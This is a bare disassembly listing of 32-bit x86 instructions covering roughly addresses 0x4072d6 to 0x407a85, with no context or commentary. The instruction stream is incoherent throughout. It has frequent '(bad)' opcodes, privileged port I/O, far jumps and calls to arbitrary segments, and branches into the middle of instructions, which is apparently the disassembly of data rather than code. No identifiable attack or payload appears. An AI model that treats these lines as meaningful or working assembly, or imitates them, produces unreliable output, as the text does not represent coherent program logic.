  4072d6:	inc    ebp
  4072d7:	jp     0x40734f
  4072d9:	pop    eax
  4072db:	in     eax,0xee
  4072dd:	cs mov ebx,0x19c6c5a
  4072e3:	pmaxub mm2,QWORD PTR [ebx]
  4072e6:	das    
  4072e7:	push   ds
  4072e8:	push   es
  4072e9:	(bad)  
  4072ea:	int    0xeb
  4072ec:	ret    0xf61f
  4072ef:	(bad)  
  4072f1:	push   edx
  4072f2:	shr    BYTE PTR [edx],1
  4072f4:	mov    ch,0x33
  4072f6:	cli    
  4072f7:	xchg   ecx,eax
  4072f8:	popa   
  4072f9:	pop    ebx
  4072fa:	mov    ah,0xd7
  4072fc:	rol    DWORD PTR [ebp-0x31],cl
  4072ff:	ins    DWORD PTR es:[edi],dx
  407300:	aad    0xad
  407302:	test   BYTE PTR [ebx-0x4],cl
  407305:	cmp    DWORD PTR [eax-0x4b],0xffffffac
  407309:	ret    0x1bbf
  40730c:	iret   
  40730d:	mov    DWORD PTR [eax-0x45a1434f],ecx
  407313:	fist   WORD PTR [esi-0x13]
  407316:	test   eax,0x895c8daf
  40731b:	xchg   BYTE PTR [edx+0x68],dh
  40731e:	xor    eax,0xcfe30ddd
  407323:	arpl   di,bp
  407325:	jbe    0x407366
  407327:	jmp    0x891a851e
  40732c:	aas    
  40732d:	sub    eax,0xc2fb65a6
  407332:	mov    ecx,0xeeafae7c
  407337:	fadd   DWORD PTR [edi-0x43f6bea1]
  40733d:	loopne 0x407364
  40733f:	int    0x82
  407341:	vmread DWORD PTR [ebx+edx*4-0x7c],edx
  407346:	in     eax,0xe8
  407348:	std    
  407349:	es dec eax
  40734b:	ins    BYTE PTR es:[edi],dx
  40734c:	adc    DWORD PTR [esi-0x64],edi
  40734f:	imul   esi,DWORD PTR [ecx],0x6c
  407352:	mov    bl,0x3e
  407354:	add    DWORD PTR [ebx-0x9],edx
  407357:	lds    esp,FWORD PTR [esi+0x27]
  40735a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40735b:	out    dx,al
  40735c:	call   0xe98e247f
  407361:	add    BYTE PTR [edx+0x1c],cl
  407364:	dec    ecx
  407365:	mov    ah,0xf3
  407367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407368:	daa    
  407369:	jle    0x4073e7
  40736b:	ins    BYTE PTR es:[edi],dx
  40736c:	push   0xb3b499ec
  407371:	lods   al,BYTE PTR ds:[esi]
  407372:	mov    eax,0xb60cbf37
  407377:	pand   mm2,QWORD PTR [ebx-0x7f7579fb]
  40737e:	in     eax,dx
  40737f:	je     0x407325
  407381:	inc    BYTE PTR [edx-0x6fc9b22b]
  407387:	(bad)  
  407388:	xchg   ebp,eax
  407389:	aaa    
  40738a:	dec    ebp
  40738b:	ret    0x54d1
  40738e:	cmp    DWORD PTR [esi],edi
  407390:	imul   ebp,DWORD PTR [edx+ebp*4+0x72935f63],0x41
  407398:	stos   DWORD PTR es:[edi],eax
  407399:	mov    bl,0x23
  40739b:	sub    esp,esp
  40739d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40739e:	cdq    
  40739f:	(bad)  
  4073a0:	lock xor edx,DWORD PTR [edx]
  4073a3:	mov    ecx,0xfde11223
  4073a8:	pop    ds
  4073a9:	stc    
  4073aa:	shr    ebx,1
  4073ac:	pop    ecx
  4073ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ae:	dec    eax
  4073af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073b0:	fwait
  4073b1:	and    al,0x23
  4073b3:	jle    0x407344
  4073b5:	sbb    DWORD PTR [ebx+0x1c],esi
  4073b8:	js     0x407396
  4073ba:	add    eax,0xc136c338
  4073bf:	sti    
  4073c0:	push   cs
  4073c1:	bsr    ecx,DWORD PTR [bx+si]
  4073c5:	(bad)  
  4073c6:	rcl    cl,cl
  4073c8:	mov    ds:0x546a316e,al
  4073cd:	(bad)  
  4073ce:	jo     0x407397
  4073d0:	xor    edx,eax
  4073d2:	aas    
  4073d3:	in     eax,dx
  4073d4:	ds cld 
  4073d6:	lods   eax,DWORD PTR ds:[esi]
  4073d7:	adc    BYTE PTR ds:0x4ffb12ba,dl
  4073dd:	add    al,BYTE PTR [eax-0x6b]
  4073e0:	es push cs
  4073e2:	mov    dl,ch
  4073e4:	rol    DWORD PTR [edi+0x5f1de933],cl
  4073ea:	js     0x407412
  4073ec:	ins    DWORD PTR es:[edi],dx
  4073ed:	or     ebp,edx
  4073ef:	add    BYTE PTR [eax],dl
  4073f1:	and    al,0x25
  4073f3:	loop   0x4073b5
  4073f5:	dec    esi
  4073f6:	les    eax,FWORD PTR ds:0x8dfca49f
  4073fc:	icebp  
  4073fd:	mov    bl,0x1a
  4073ff:	xlat   BYTE PTR ds:[ebx]
  407400:	out    0x3c,al
  407402:	popf   
  407403:	cmc    
  407404:	test   eax,0x3f281d42
  407409:	cld    
  40740a:	aaa    
  40740b:	dec    edi
  40740c:	ins    BYTE PTR es:[edi],dx
  40740d:	call   DWORD PTR [edx]
  40740f:	cmp    BYTE PTR ds:0x1f5b9ad2,0x2e
  407416:	mov    esp,0x779e6b9b
  40741b:	fcom   DWORD PTR [esi+eiz*8+0x4c]
  40741f:	inc    esi
  407420:	popa   
  407421:	jbe    0x407445
  407423:	fld    DWORD PTR [ecx+ebp*1+0x7d]
  407427:	jbe    0x4073f9
  407429:	out    dx,eax
  40742a:	int3   
  40742b:	ret    
  40742c:	sar    esi,cl
  40742e:	cmp    BYTE PTR [ecx-0x5f],dl
  407431:	adc    eax,0x753aeeb
  407436:	sbb    bl,BYTE PTR [ebx+esi*8]
  407439:	sub    eax,0x3845babd
  40743e:	jl     0x407445
  407440:	push   0xd460f0ac
  407445:	jl     0x407457
  407447:	dec    esi
  407448:	inc    ebx
  407449:	(bad)  
  40744a:	(bad)  
  40744b:	js     0x407472
  40744d:	adc    BYTE PTR [esp+edx*2],bh
  407450:	pusha  
  407451:	aas    
  407452:	push   ecx
  407453:	dec    eax
  407454:	call   FWORD PTR [eax+0x4a4ff090]
  40745a:	push   eax
  40745b:	jb     0x407465
  40745d:	xchg   DWORD PTR [ecx+ebp*4],esp
  407460:	mov    ebx,0xe13ea46f
  407465:	xchg   edi,eax
  407466:	sti    
  407467:	popa   
  407468:	in     eax,dx
  407469:	jns    0x4074d0
  40746b:	rcl    BYTE PTR [ebx+0x62],cl
  40746e:	ret    0x21bf
  407471:	sub    eax,0xbad817fc
  407476:	enter  0xbeb5,0xa3
  40747a:	cmp    bh,BYTE PTR [esi]
  40747c:	ret    
  40747d:	mov    ds:0x7ea2b257,al
  407482:	int    0x4f
  407484:	pop    edi
  407485:	sbb    BYTE PTR [edx+0x3d],dh
  407488:	jle    0x4074f7
  40748a:	xchg   ecx,eax
  40748b:	adc    al,0x4a
  40748d:	out    dx,eax
  40748e:	in     eax,dx
  40748f:	xor    BYTE PTR [ecx+edx*8-0x9],0xc6
  407494:	sti    
  407495:	mov    ecx,0xa49584c8
  40749a:	pop    ecx
  40749b:	cmp    esi,DWORD PTR [eax-0x2eede9d1]
  4074a1:	inc    edi
  4074a2:	push   ss
  4074a3:	mov    ch,0x48
  4074a5:	inc    ebp
  4074a6:	(bad)  
  4074a7:	nop
  4074a8:	mov    edi,0x1c9a8c22
  4074ad:	jmp    0x7418:0x76b26a9c
  4074b4:	cmp    BYTE PTR [esi-0x6],ch
  4074b7:	add    DWORD PTR [esi-0x30],0xffffffd3
  4074bb:	(bad)  
  4074bc:	retf   
  4074bd:	pop    esp
  4074be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074bf:	jmp    0x602eb151
  4074c4:	mov    ebx,0xb7bf98f0
  4074c9:	loope  0x40752b
  4074cb:	mov    edi,0x96c7fa93
  4074d0:	inc    ecx
  4074d1:	int    0xa1
  4074d3:	bound  ebp,QWORD PTR [edi-0x37]
  4074d6:	das    
  4074d7:	pop    es
  4074d8:	shr    DWORD PTR [eax+eax*2+0x27f900d7],1
  4074df:	int    0xc2
  4074e1:	inc    esi
  4074e2:	inc    ebp
  4074e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074e4:	push   ecx
  4074e5:	mov    eax,ds:0x4e48c37
  4074ea:	test   eax,0xca1e08a5
  4074ef:	jb     0x40755c
  4074f1:	jne    0x40747c
  4074f3:	xor    DWORD PTR [edi-0x3a],ebp
  4074f6:	loope  0x4074ab
  4074f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074f9:	(bad)  
  4074fa:	jl     0x4074a7
  4074fc:	test   eax,ecx
  4074fe:	mov    bh,dl
  407500:	adc    BYTE PTR [eax+0x2377b53a],al
  407506:	in     eax,dx
  407507:	sub    BYTE PTR [edi+0x77],0x14
  40750b:	js     0x4074bc
  40750d:	or     eax,0x8d13cf85
  407512:	mov    esp,0xe9542e1a
  407517:	ins    DWORD PTR es:[edi],dx
  407518:	adc    BYTE PTR [edx+edi*4],al
  40751b:	inc    eax
  40751c:	xchg   DWORD PTR [ebx+0x36],ebx
  40751f:	mov    edi,0x6b526362
  407524:	and    bh,BYTE PTR [edx-0x7e]
  407527:	fsubr  st,st(5)
  407529:	mov    al,0x5c
  40752b:	(bad)  
  40752c:	(bad)  
  40752d:	in     al,0xe5
  40752f:	loopne 0x4074e9
  407531:	push   edx
  407532:	cmc    
  407533:	sbb    dh,ch
  407535:	leave  
  407536:	je     0x4074d5
  407538:	or     al,0x35
  40753a:	jecxz  0x407542
  40753c:	in     al,dx
  40753d:	sbb    bh,bl
  40753f:	cmp    DWORD PTR [edx],edi
  407541:	sbb    DWORD PTR [ebp+0x3a],ebx
  407544:	fs mov esi,0x9acf7967
  40754a:	push   eax
  40754b:	jnp    0x4075a8
  40754d:	xchg   edi,eax
  40754e:	jno    0x407549
  407550:	dec    eax
  407551:	div    BYTE PTR [edi]
  407553:	iret   
  407554:	sti    
  407555:	add    DWORD PTR [eax-0x3d34c700],ebx
  40755b:	mov    al,ds:0x932c3832
  407560:	int3   
  407561:	push   ebp
  407562:	dec    ecx
  407563:	adc    edx,DWORD PTR [ebx-0x2a]
  407566:	mov    ebx,0x2b23d495
  40756b:	sbb    ebx,ebx
  40756d:	out    dx,al
  40756e:	inc    esp
  40756f:	leave  
  407570:	add    eax,DWORD PTR [ebx-0x34]
  407573:	pop    eax
  407574:	outs   dx,DWORD PTR ds:[esi]
  407575:	push   edx
  407576:	jb     0x4075bd
  407578:	adc    BYTE PTR [edi+0x3c],ch
  40757b:	(bad)  
  40757c:	inc    esp
  40757d:	test   esp,eax
  40757f:	sub    dl,BYTE PTR [esi]
  407581:	cmc    
  407582:	sbb    ebp,ecx
  407584:	push   edx
  407585:	adc    DWORD PTR [eax+eax*2],ebp
  407588:	pop    eax
  407589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40758a:	add    DWORD PTR [ecx-0x4df3c8a],ebp
  407590:	imul   ecx,ebx,0x6b
  407593:	lds    esp,FWORD PTR [ebx-0x53d1aec8]
  407599:	or     DWORD PTR [esi-0x1b],ebx
  40759c:	int    0x60
  40759e:	leave  
  40759f:	xchg   esi,eax
  4075a0:	jge    0x407578
  4075a2:	mov    WORD PTR [ebp-0x23cc09fb],es
  4075a8:	push   esp
  4075a9:	dec    ecx
  4075aa:	pop    ecx
  4075ab:	xor    eax,0xc0fff325
  4075b0:	fist   DWORD PTR [ebp+0x3e]
  4075b3:	or     eax,0x6febe624
  4075b8:	bound  esp,QWORD PTR [ecx+0x150f73c1]
  4075be:	and    DWORD PTR [esi-0x49164398],ebp
  4075c4:	cmp    bh,BYTE PTR [ebx-0x40]
  4075c7:	loopne 0x407633
  4075c9:	or     BYTE PTR [ebx-0x16b4fcce],dh
  4075cf:	push   ecx
  4075d0:	es pop es
  4075d2:	jbe    0x4075e9
  4075d4:	aas    
  4075d5:	loope  0x407655
  4075d7:	pop    ss
  4075d8:	sub    DWORD PTR [edx+0x3359c774],esi
  4075de:	or     ecx,ebx
  4075e0:	rol    cl,1
  4075e2:	mov    ds:0xbabfed7e,eax
  4075e7:	xor    ecx,DWORD PTR [eax-0x13]
  4075ea:	ins    BYTE PTR es:[edi],dx
  4075eb:	mov    al,BYTE PTR [eax+0x1cf185e6]
  4075f1:	or     edx,DWORD PTR [edx]
  4075f3:	(bad)  
  4075f4:	dec    ecx
  4075f5:	xor    BYTE PTR [eax],dh
  4075f7:	aaa    
  4075f8:	xlat   BYTE PTR ds:[ebx]
  4075f9:	fld    DWORD PTR [esi-0x619c0dd9]
  4075ff:	inc    ebp
  407600:	dec    eax
  407601:	icebp  
  407602:	inc    ebp
  407603:	aad    0xd
  407605:	add    ch,BYTE PTR [ebx-0x3d94279b]
  40760b:	push   edx
  40760c:	ror    DWORD PTR [ebx+0x18fcd30c],cl
  407612:	hlt    
  407613:	pop    esi
  407614:	cs je  0x407604
  407617:	std    
  407618:	(bad)  
  407619:	jmp    0xff35:0xa83d69f0
  407620:	jnp    0x407697
  407622:	lahf   
  407623:	pop    edx
  407624:	dec    ecx
  407625:	push   ebp
  407626:	jo     0x4075dd
  407628:	aam    0xcd
  40762a:	outs   dx,DWORD PTR ds:[esi]
  40762b:	call   DWORD PTR [edi]
  40762d:	out    dx,eax
  40762e:	data16 or BYTE PTR [ecx+0x315f6d5],0x70
  407636:	xchg   esi,eax
  407637:	scas   eax,DWORD PTR es:[edi]
  407638:	cmp    al,0x3f
  40763a:	ror    DWORD PTR [edx-0x3d],0xc6
  40763e:	add    al,0xaa
  407640:	and    DWORD PTR [esi],ebx
  407642:	dec    eax
  407643:	adc    BYTE PTR [edx-0x3a],0x5e
  407647:	push   esi
  407648:	(bad)  
  407649:	jne    0x407628
  40764b:	imul   ebx,DWORD PTR [eax+edi*8-0x4c0064b6],0x26
  407653:	pop    ss
  407654:	mov    cl,0xed
  407656:	das    
  407657:	ficom  WORD PTR [esi+0x5d22ab58]
  40765d:	sub    al,0x8c
  40765f:	lods   eax,DWORD PTR ds:[esi]
  407660:	xor    al,0x9f
  407662:	or     DWORD PTR [ebp+0x1a00d00b],ecx
  407668:	cvtps2pi mm4,QWORD PTR [ebx+eax*1-0x4209d168]
  407670:	ins    DWORD PTR es:[edi],dx
  407671:	sbb    edx,edx
  407673:	lods   eax,DWORD PTR ds:[esi]
  407674:	nop
  407675:	dec    esp
  407676:	sti    
  407677:	int    0xa1
  407679:	sbb    DWORD PTR [esi],edx
  40767b:	cdq    
  40767c:	push   eax
  40767d:	sti    
  40767e:	mov    esp,0x3293103b
  407683:	lods   al,BYTE PTR ds:[esi]
  407684:	mov    BYTE PTR [edi],ch
  407686:	push   0x2f09e938
  40768b:	aaa    
  40768c:	shl    cl,cl
  40768e:	sbb    eax,0x122e42ab
  407693:	adc    esp,ecx
  407695:	xor    eax,0x48b420ee
  40769a:	repz xchg esi,eax
  40769c:	stc    
  40769d:	mov    al,0x1f
  40769f:	xlat   BYTE PTR ds:[ebx]
  4076a0:	sahf   
  4076a1:	add    eax,0x7c2e22f
  4076a6:	dec    edi
  4076a7:	cmp    al,0xa9
  4076a9:	mov    bl,0x82
  4076ab:	dec    ebx
  4076ac:	inc    ebp
  4076ad:	arpl   WORD PTR ds:0x4ae2d5a4,bx
  4076b3:	pop    ds
  4076b4:	mov    esp,0x99b47d34
  4076b9:	push   eax
  4076ba:	mov    ch,0x32
  4076bc:	mov    ds:0x7980ecc5,al
  4076c1:	push   esi
  4076c2:	loope  0x4076b3
  4076c4:	jp     0x40767f
  4076c6:	mov    ecx,0x8d42b689
  4076cb:	mov    esp,DWORD PTR ss:[eax]
  4076ce:	jmp    0x407662
  4076d0:	xchg   esp,ecx
  4076d2:	je     0x4076f7
  4076d4:	jl     0x4076ec
  4076d6:	js     0x4076e9
  4076d8:	fadd   st(0),st
  4076da:	fisttp QWORD PTR [edi+0x48f7f084]
  4076e0:	adc    edi,DWORD PTR [ebp-0x457f7fc7]
  4076e6:	add    DWORD PTR [eax+0x13341e43],ebp
  4076ec:	jg     0x407714
  4076ee:	aaa    
  4076ef:	pop    ebp
  4076f0:	adc    al,0x27
  4076f2:	xchg   edx,eax
  4076f3:	jae    0x40773f
  4076f5:	jo     0x4076bc
  4076f7:	xchg   edx,eax
  4076f8:	xor    DWORD PTR [ecx],ebx
  4076fa:	mov    dl,0x90
  4076fc:	inc    edx
  4076fd:	fcomp  QWORD PTR [esi-0x23]
  407700:	pop    ebp
  407701:	aaa    
  407702:	(bad)  
  407703:	gs pop esp
  407705:	jns    0x4076dc
  407707:	push   edi
  407708:	ss es pop ss
  40770b:	fst    DWORD PTR [ecx-0x19e26595]
  407711:	and    eax,0x97113527
  407716:	push   0x1a7dbda0
  40771b:	mov    bh,0xee
  40771d:	push   cs
  40771e:	ficomp WORD PTR [eax+0x1a]
  407721:	fldenv [ebx]
  407724:	sahf   
  407725:	xchg   edx,eax
  407726:	(bad)  
  407727:	jb     0x407702
  407729:	push   esi
  40772a:	add    BYTE PTR [eax],ah
  40772c:	popa   
  40772d:	pop    ss
  40772e:	test   BYTE PTR [eax+0x7c],al
  407731:	jo     0x40778a
  407733:	addr16 push esi
  407735:	xchg   esp,eax
  407736:	pcmpeqb mm4,QWORD PTR [ecx]
  407739:	mov    eax,0xb6da3e3
  40773e:	push   es
  40773f:	call   0x9062a7e8
  407744:	(bad)  
  407745:	adc    dh,ch
  407747:	je     0x407728
  407749:	jns    0x4076f1
  40774b:	xchg   edx,eax
  40774c:	add    DWORD PTR [ecx],0x95b6df3d
  407752:	lods   eax,DWORD PTR ds:[esi]
  407753:	jl     0x40775f
  407755:	jge    0x407742
  407757:	int3   
  407758:	xchg   ebp,eax
  407759:	retf   
  40775a:	jmp    0x4076f0
  40775c:	jnp    0x4076e9
  40775e:	test   eax,0xc38da37d
  407763:	jmp    0x9974:0xcfc6a278
  40776a:	xor    ebx,DWORD PTR [edi+eiz*2+0x2c63b061]
  407771:	test   eax,0x79d47ed
  407776:	xchg   ecx,eax
  407777:	or     bh,BYTE PTR [eax]
  407779:	(bad)  
  40777a:	mov    bh,0x3c
  40777c:	mov    cl,BYTE PTR [esi+0x7]
  40777f:	shl    DWORD PTR [ebp-0x5dc087c0],0xf3
  407786:	stc    
  407787:	icebp  
  407788:	add    ah,BYTE PTR [eax+0x44]
  40778b:	mov    DWORD PTR ds:0x641bb90f,0x929d4f1a
  407795:	sbb    bl,dh
  407797:	mov    DWORD PTR [edi+0x6df4b803],ecx
  40779d:	xor    DWORD PTR [eax],esi
  40779f:	push   0x50
  4077a1:	xor    eax,0x9672335
  4077a6:	xchg   edx,eax
  4077a7:	mov    ebp,0x903325f4
  4077ac:	mov    eax,0x34fec7fc
  4077b1:	call   0x3625:0x82949df8
  4077b8:	or     ecx,DWORD PTR [edi-0x426cd01b]
  4077be:	popa   
  4077bf:	jmp    0x4077cb
  4077c1:	cld    
  4077c2:	sub    al,0x5a
  4077c4:	popf   
  4077c5:	push   eax
  4077c6:	ficomp WORD PTR [ecx+0x53]
  4077c9:	fcomp  DWORD PTR [ecx]
  4077cb:	jne    0x4077f6
  4077cd:	adc    dh,BYTE PTR [esi]
  4077cf:	dec    esp
  4077d0:	test   al,0x34
  4077d2:	call   0xc9742c38
  4077d7:	rol    bh,0xc7
  4077da:	mov    dl,0x3f
  4077dc:	fisub  DWORD PTR [edx+0x3bdf8b2]
  4077e2:	adc    al,0xd6
  4077e4:	xchg   BYTE PTR [ebp+0x6c9a4c3d],ah
  4077ea:	outs   dx,BYTE PTR ds:[esi]
  4077eb:	add    bl,cl
  4077ed:	xor    edi,DWORD PTR [ebx]
  4077ef:	inc    ebx
  4077f0:	pop    esp
  4077f1:	cwde   
  4077f2:	ins    DWORD PTR es:[edi],dx
  4077f3:	xchg   edx,eax
  4077f4:	mov    DWORD PTR [edx],edi
  4077f6:	xchg   ebp,eax
  4077f7:	ins    DWORD PTR es:[edi],dx
  4077f8:	mov    WORD PTR [eax+0x36d319d5],ss
  4077fe:	ret    0x98ee
  407801:	arpl   WORD PTR [edx+0x19],di
  407804:	pop    ecx
  407805:	cdq    
  407806:	pop    esp
  407807:	sub    dx,WORD PTR [ebx-0xfcecb97]
  40780e:	ret    0xeb9c
  407811:	cmc    
  407812:	jmp    DWORD PTR [edx]
  407814:	clc    
  407815:	adc    BYTE PTR [edi],bh
  407817:	cmp    DWORD PTR [ebx-0x75d2ca40],0x42
  40781e:	or     ebp,DWORD PTR [eax]
  407820:	loop   0x407843
  407822:	mov    ds:0x26b92a75,eax
  407827:	dec    esp
  407828:	mov    al,ds:0x8ce69726
  40782e:	test   eax,0x65a2314e
  407833:	mov    al,ds:0x51c2bdbd
  407838:	push   edi
  407839:	push   eax
  40783a:	jne    0x4077be
  40783c:	das    
  40783d:	loop   0x407826
  40783f:	xor    ecx,ecx
  407841:	test   DWORD PTR [edi],0xc3db0e92
  407847:	jle    0x40783d
  407849:	(bad)
  40784d:	hlt    
  40784e:	mov    ds:0x15ec0b96,eax
  407853:	pop    esi
  407854:	jbe    0x4078a6
  407856:	mov    DWORD PTR [ebp+0x388e416f],esp
  40785c:	jne    0x4077ee
  40785e:	retf   0xefad
  407861:	dec    eax
  407862:	xchg   ebp,eax
  407863:	mov    ds:0xa295eb97,al
  407868:	daa    
  407869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40786a:	adc    ebp,DWORD PTR [esi]
  40786c:	pop    ss
  40786d:	add    DWORD PTR [ecx],esi
  40786f:	scas   eax,DWORD PTR es:[edi]
  407870:	js     0x407852
  407872:	movsx  edi,BYTE PTR [eax]
  407875:	retf   
  407876:	lahf   
  407877:	pop    esi
  407878:	ins    DWORD PTR es:[edi],dx
  407879:	dec    ebx
  40787a:	lods   al,BYTE PTR ds:[esi]
  40787b:	xchg   BYTE PTR [ebx+0x34af0485],bl
  407881:	mov    ah,0xf0
  407883:	inc    ebp
  407884:	inc    ebx
  407885:	mov    dl,0x89
  407887:	cmp    eax,ecx
  407889:	pusha  
  40788a:	retf   
  40788b:	fidivr WORD PTR [edi+eiz*4-0x24]
  40788f:	mov    bh,0x12
  407891:	int    0xb3
  407893:	push   ebx
  407894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407895:	xchg   BYTE PTR [ecx+ebp*2-0x4b1b6689],bl
  40789c:	mov    dh,0x38
  40789e:	leave  
  40789f:	ins    BYTE PTR es:[edi],dx
  4078a0:	stc    
  4078a1:	repnz cmp esp,DWORD PTR [ebp+0x3d25e7c]
  4078a8:	shl    BYTE PTR [esi+ecx*1],1
  4078ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078ac:	sbb    BYTE PTR [ecx],0xac
  4078af:	fisttp WORD PTR [ecx-0x66]
  4078b2:	mov    ebp,0x3de321eb
  4078b7:	xlat   BYTE PTR ds:[ebx]
  4078b8:	jle    0x4078cd
  4078ba:	sub    edx,DWORD PTR [eax]
  4078bc:	repz inc ecx
  4078be:	mov    bh,0x49
  4078c0:	pusha  
  4078c1:	and    al,0xbf
  4078c3:	in     eax,dx
  4078c4:	or     ebx,DWORD PTR [esi]
  4078c6:	mov    ecx,0x8f9efb5c
  4078cb:	out    0x4a,al
  4078cd:	or     dl,BYTE PTR [edi+0x3ef00850]
  4078d3:	cld    
  4078d4:	stc    
  4078d5:	mov    DWORD PTR [ecx-0x54c39c16],edx
  4078db:	loope  0x407869
  4078dd:	imul   ebx,DWORD PTR [eax+0x2c],0x29
  4078e1:	lods   al,BYTE PTR ds:[esi]
  4078e2:	or     DWORD PTR [edi+0x25],ebx
  4078e5:	gs mov ebp,0x2fcf1fc1
  4078eb:	jecxz  0x4078d5
  4078ed:	adc    BYTE PTR [ebx+0x3ef8f84f],al
  4078f3:	sub    ebx,DWORD PTR [eax+0x33fa7b1c]
  4078f9:	mov    bl,0x62
  4078fb:	stos   DWORD PTR es:[edi],eax
  4078fc:	popa   
  4078fd:	mov    ch,0x34
  4078ff:	push   edx
  407900:	add    al,0x3b
  407902:	jbe    0x407956
  407904:	cdq    
  407905:	jp     0x407891
  407907:	xchg   edx,eax
  407908:	cmp    eax,0xad37fdae
  40790d:	cmp    DWORD PTR [edi-0x7497fdce],esi
  407913:	dec    ebp
  407914:	ins    BYTE PTR es:[edi],dx
  407915:	add    al,0x6a
  407917:	dec    ecx
  407918:	mov    eax,0x6a20672
  40791d:	sub    edx,DWORD PTR [ecx-0x61]
  407920:	popa   
  407921:	int3   
  407922:	inc    esp
  407923:	call   0x7b4c:0x18217ad4
  40792a:	pop    eax
  40792b:	dec    edi
  40792c:	xchg   edx,eax
  40792d:	scas   eax,DWORD PTR es:[edi]
  40792e:	sahf   
  40792f:	cdq    
  407930:	jecxz  0x4078bd
  407932:	aam    0x8d
  407934:	jmp    0x462018c2
  407939:	adc    eax,0x87aa12f2
  40793e:	loopne 0x407941
  407940:	inc    eax
  407941:	jmp    0x407974
  407943:	mov    cl,0xfc
  407945:	pop    edx
  407946:	push   eax
  407947:	push   edx
  407948:	mov    esp,0x54c3a62c
  40794d:	mov    ebp,0xee581c74
  407952:	cmp    ebp,eax
  407954:	iret   
  407955:	rol    ebp,0x89
  407958:	push   ds
  407959:	loopne 0x40798a
  40795b:	jns    0x40798b
  40795d:	pop    ecx
  40795e:	jb     0x407906
  407960:	ss nop
  407962:	mov    dl,0x68
  407964:	fld    QWORD PTR ss:[edi-0x50ecdf9d]
  40796b:	sbb    al,0x55
  40796d:	int    0x64
  40796f:	retf   
  407970:	mov    cl,0xeb
  407972:	adc    al,BYTE PTR [ebp-0x3b4d44f6]
  407978:	dec    eax
  407979:	aam    0x2f
  40797b:	adc    DWORD PTR [esi+eax*1+0x494c2a82],ebp
  407982:	fdiv   st,st(7)
  407984:	add    bh,BYTE PTR [ebp-0x3bfd424f]
  40798a:	test   al,0x96
  40798c:	call   0xef922d9f
  407991:	ins    DWORD PTR es:[edi],dx
  407992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407993:	in     al,0x1e
  407995:	leave  
  407996:	jns    0x4079cb
  407998:	xor    esp,DWORD PTR [esi-0x51]
  40799b:	mov    dl,0x8
  40799d:	mov    bl,0xac
  40799f:	jle    0x407928
  4079a1:	and    ecx,DWORD PTR [edx-0x1d213093]
  4079a7:	loop   0x4079ad
  4079a9:	dec    ebp
  4079aa:	inc    edi
  4079ab:	es and eax,0x7bac4b57
  4079b1:	push   ebp
  4079b2:	pop    edx
  4079b3:	les    edx,FWORD PTR [esi-0x7f]
  4079b6:	sbb    al,0x6a
  4079b8:	jg     0x4079e7
  4079ba:	stos   DWORD PTR es:[edi],eax
  4079bb:	push   es
  4079bc:	xchg   edx,eax
  4079bd:	loope  0x407a0f
  4079bf:	sbb    bl,BYTE PTR [edx]
  4079c1:	xchg   DWORD PTR [edx-0x86df02d],eax
  4079c7:	jg     0x407a47
  4079c9:	test   al,0x83
  4079cc:	push   eax
  4079cd:	mov    al,ds:0x47132c17
  4079d2:	sub    al,0x37
  4079d4:	pop    esp
  4079d5:	sub    al,0xa4
  4079d7:	aaa    
  4079d8:	jne    0x4079cf
  4079da:	jp     0x4079c7
  4079dc:	pop    edi
  4079dd:	je     0x407a2c
  4079df:	inc    esp
  4079e0:	rcr    cl,0x31
  4079e3:	push   edi
  4079e4:	mov    WORD PTR [esi],fs
  4079e6:	jp     0x407a02
  4079e8:	frstor [edi-0x4fd30033]
  4079ee:	out    0x3,al
  4079f0:	into   
  4079f1:	aam    0x41
  4079f3:	push   eax
  4079f4:	retf   
  4079f5:	pop    DWORD PTR [eax-0x3e]
  4079f8:	cwde   
  4079f9:	outs   dx,DWORD PTR ds:[esi]
  4079fa:	mov    ebp,0x5204e98
  4079ff:	stc    
  407a00:	jp     0x4079a9
  407a02:	cmp    DWORD PTR [edi-0x58],edi
  407a05:	es add ebp,esp
  407a08:	(bad)  
  407a09:	arpl   WORD PTR [ecx],di
  407a0b:	cs lock ja 0x407a0b
  407a0f:	mov    cl,0xf5
  407a11:	sub    al,0x4f
  407a13:	es and eax,0x12e0fd48
  407a19:	xor    DWORD PTR [ecx-0x14c9ba0],0x6cec3cfb
  407a23:	icebp  
  407a24:	daa    
  407a25:	mov    ch,0x73
  407a27:	popa   
  407a28:	in     al,dx
  407a29:	inc    eax
  407a2a:	pop    es
  407a2b:	adc    esi,DWORD PTR [edi]
  407a2d:	scas   al,BYTE PTR es:[edi]
  407a2e:	(bad)  
  407a2f:	mov    bh,0xa3
  407a31:	jb     0x4079d3
  407a33:	fcomi  st,st(3)
  407a35:	ins    BYTE PTR es:[edi],dx
  407a36:	or     BYTE PTR [ecx-0x56],dh
  407a39:	retf   0xba79
  407a3c:	fnsave [edx+0x1a]
  407a3f:	sbb    ah,BYTE PTR [ecx]
  407a41:	out    0x25,al
  407a43:	xor    al,0x33
  407a45:	xchg   DWORD PTR [esi+0x1f],ecx
  407a48:	mov    dl,0x16
  407a4a:	mov    dl,0x53
  407a4c:	mov    ebx,0x8480d0e8
  407a51:	push   0x26
  407a53:	inc    esi
  407a54:	int3   
  407a55:	gs dec esi
  407a57:	aad    0x7f
  407a59:	pop    ecx
  407a5a:	bound  edx,QWORD PTR [ebx]
  407a5c:	ss add al,0x46
  407a5f:	jmp    0x4528:0x63e83524
  407a66:	frndint 
  407a68:	test   DWORD PTR [eax],0xf6b0bcae
  407a6e:	mov    bl,0x45
  407a70:	mov    BYTE PTR [edx+eiz*8-0x26],ah
  407a74:	lock ins DWORD PTR es:[edi],dx
  407a76:	jl     0x407ace
  407a78:	ficom  DWORD PTR [ebx]
  407a7a:	test   al,0x8d
  407a7c:	ret    
  407a7d:	call   0x87a3:0x169927d2
  407a84:	xchg   ebx,eax
  407a85:	aaa    
